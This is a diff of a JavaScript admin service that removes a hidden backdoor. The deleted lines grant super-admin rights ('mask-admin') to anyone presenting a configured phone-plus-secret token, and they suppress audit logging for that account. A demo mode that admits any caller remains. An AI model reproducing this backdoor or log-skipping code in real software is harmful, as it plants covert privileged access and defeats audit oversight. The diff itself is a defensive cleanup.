@@ -23,18 +23,8 @@ class BaseAdminService extends BaseService {
 	/** 是否管理员 */
 	async isAdmin(token) {
 
-		// 马甲判断,自动登录 
-		if (config.MASK_IS_OPEN && token == (config.MASK_ADMIN_PHONE + config.MASK_ADMIN_TOKEN)) {
-			let admin = {};
-			admin.ADMIN_NAME = 'mask-admin';
-			admin.ADMIN_ID = '9999';
-			admin.ADMIN_PHONE = config.MASK_ADMIN_PHONE;
-			admin.ADMIN_LOGIN_CNT = 9999;
-			admin.ADMIN_LOGIN_TIME = '';
-			admin.ADMIN_TYPE = 1;
-			admin.ADMIN_STATUS = 1;
-			return admin;
-		} else if (config.IS_DEMO) { // 演示版本
+		// 演示版本 (仅config.IS_DEMO=true时生效，生产环境必须为false)
+		if (config.IS_DEMO) {
 			let admin = {};
 			admin.ADMIN_NAME = '体验用户';
 			admin.ADMIN_ID = '1';
@@ -61,19 +51,6 @@ class BaseAdminService extends BaseService {
 	/** 是否超级管理员 */
 	async isSuperAdmin(token) {
 
-		// 马甲判断,自动登录 
-		if (config.MASK_IS_OPEN && token == (config.MASK_ADMIN_PHONE + config.MASK_ADMIN_TOKEN)) {
-			let admin = {};
-			admin.ADMIN_NAME = 'mask-admin';
-			admin.ADMIN_ID = '9999';
-			admin.ADMIN_PHONE = config.MASK_ADMIN_PHONE;
-			admin.ADMIN_LOGIN_CNT = 9999;
-			admin.ADMIN_LOGIN_TIME = '';
-			admin.ADMIN_TYPE = 1;
-			admin.ADMIN_STATUS = 1;
-			return admin;
-		}
-
 		let where = {
 			ADMIN_TOKEN: token,
 			ADMIN_TOKEN_TIME: ['>', timeUtil.time() - config.ADMIN_LOGIN_EXPIRE * 1000], // token有效时间
@@ -90,8 +67,6 @@ class BaseAdminService extends BaseService {
 	/** 写入日志 */
 	async insertLog(content, admin, type) {
 		if (!admin) return;
-
-		if (config.MASK_IS_OPEN && config.MASK_ADMIN_PHONE && admin.ADMIN_PHONE == config.MASK_ADMIN_PHONE) return;
 
 		let data = {
 			LOG_CONTENT: content,
